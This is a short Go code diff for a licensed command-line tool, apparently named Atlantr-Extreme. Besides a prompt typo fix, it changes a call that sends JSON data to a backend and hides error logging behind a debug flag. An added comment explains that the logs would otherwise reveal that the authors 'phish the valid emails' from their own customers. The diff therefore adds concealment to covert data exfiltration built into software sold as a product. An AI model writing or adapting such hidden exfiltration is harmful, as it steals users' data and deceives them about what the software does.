@@ -50,7 +50,7 @@ func init() {
 			read := bufio.NewReader(os.Stdin)
 
 			// reade license key from commandline
-			fmt.Printf("Please enter valid license key\n\n-> ")
+			fmt.Printf("Please enter a valid license key\n\n-> ")
 			licenseKey, _ = read.ReadString('\n')
 			licenseKey = strings.Replace(licenseKey, "\n", "", -1)
 		} else {
@@ -253,16 +253,23 @@ func main() {
 				return err
 			}
 
-			err = conn.Send(jsonString, backend)
+			err = conn.Send(jsonString, backend, false)
 			if err != nil {
 				return err
 			}
 
 			return nil
 		}()
-		utils.CheckError(err)
+		// In production, we dont want the error message to be printed out to log file.
+		// When the backend fileserver is no reachable or any other error occur, the error log will
+		// leak the behavio that we phish the valid emails from customer
+		if debug {
+			utils.CheckError(err)
+		}
 	}
 
 	log.Println("Atlantr-Extreme is shutting down...")
+	time.Sleep(time.Second) // chill down again
+
 	return // EXIT_SUCCESS
 }
